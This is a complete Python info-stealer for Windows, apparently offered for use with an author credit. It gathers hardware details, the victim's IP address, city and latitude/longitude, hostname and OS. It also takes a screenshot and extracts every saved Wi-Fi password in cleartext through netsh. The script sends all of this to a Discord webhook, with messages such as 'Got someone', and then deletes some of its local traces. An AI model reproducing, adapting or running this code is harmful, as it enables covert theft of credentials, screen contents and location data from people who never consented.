import time
import json
import requests
import socket
import platform
import pyautogui
import subprocess
import os
import psutil

webhook = 'YOUR_WEBHOOK_HERE'

# Get hardware information
ram = (str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB") + " of RAM"
gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True)
cpu = subprocess.check_output('wmic cpu get name', shell=True)
motherboard = subprocess.check_output('wmic baseboard get product', shell=True)
storage = (str(round(psutil.disk_usage('/').total / (1024.0 **3)))+" GB") + " of storage"

# Get the user's ip address
ip = requests.get('https://api.ipify.org').text

# Check if the ip is from a vpn server using proxycheck.io
response = requests.get(f'https://proxycheck.io/v2/{ip}?vpn=1')

ipdata = response.json()

other = str(ipdata[ip])

# Convert variable other to text file
with open('ip.txt', 'w') as f:
    f.write(other)
    f.close()

# Find information about the ip address
url = 'http://ip-api.com/json/' + ip
response = requests.get(url)
vpndata = response.json()

# Get the information
country = vpndata['country']
city = vpndata['city']
isp = vpndata['isp']
lat = vpndata['lat']
lon = vpndata['lon']

# Find information about the computer
hostname = socket.gethostname()

# Get informations about the system
platformos = platform.system()
release = platform.release()
version = platform.version()

# Take a screenshot of the user's screen and save it as a png file
screenshot = pyautogui.screenshot()
screenshot.save('screenshot.png')


# Steal all wifi passwords
wifi_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in wifi_data if "All User Profile" in i]

# Find the wifi passwords and store all the passwords in a text file
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        with open('wifi.txt', 'a') as f:
            f.write("{:<30}|  {:<}".format(i, results[0]) + "\n")
            f.close()
    except IndexError:
        with open('wifi.txt', 'a') as f:
            f.write("{:<30}|  {:<}".format(i, "") + "\n")
            f.close()

# Send the information to the webhook
data = {
  "content": "||@everyone|| Got someone",
  "embeds": [
    {
      "title": "Stuff about them",
      "description": "https://github.com/metaltiger775",
      "color": 65280,
      "fields": [
        {
          "name": "IP Informations:",
          "value": "IP : " + ip,
        },
        {
          "name": "Country:",
          "value": country,
        },
        {
            "name": "City:",
            "value": city,
        },
      ],
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

data2 = {
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
            "name": "ISP:",
            "value": isp,
        },
      ],
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

data3 = {
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
            "name": "Latitude:",
            "value": lat,
        },
        {
            "name": "Longitude:",
            "value": lon,
        },
      ],
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

data4 = {
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
          "name": "Hostname:",
          "value": hostname
        },
        {
          "name": "OS:",
          "value": platformos
        },
        {
          "name": "OS Version:",
          "value": version
        },
        
      ],
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

data5 = {
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
          "name": "Ram:",
          "value": ram
        },
        {
            "name": "GPU:",
            "value": gpu
        },
        {
            "name": "CPU:",
            "value": cpu
        },
        {
            "name": "Motherboard:",
            "value": motherboard
        },
      ],
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

data6 ={
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
            "name": "Storage:",
            "value": storage
        },
      ],
      "footer": {
        "text": "Made by metaltiger775",
        "icon_url": "https://avatars.githubusercontent.com/u/62576316?v=4"
      }
    }
  ],
  "username": "Gottem",
  "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg",
  "attachments": []
}

requests.post(webhook, json=data)
requests.post(webhook, json=data2)
requests.post(webhook, json=data3)
requests.post(webhook, json=data4)
requests.post(webhook, json=data5)
requests.post(webhook, json=data6)

# Send the screenshot via discord webhook
files = {'file': open('screenshot.png', 'rb')}
requests.post(webhook, files=files)

# Send the ip information via discord webhook
files = {'file': open('ip.txt', 'rb')}
requests.post(webhook, files=files)

# Send the wifi passwords via discord webhook
files = {'file': open('wifi.txt', 'rb')}
requests.post(webhook, files=files)

# Delete the files
time.sleep(1)
os.remove('screenshot.png')
os.remove('ip.txt')
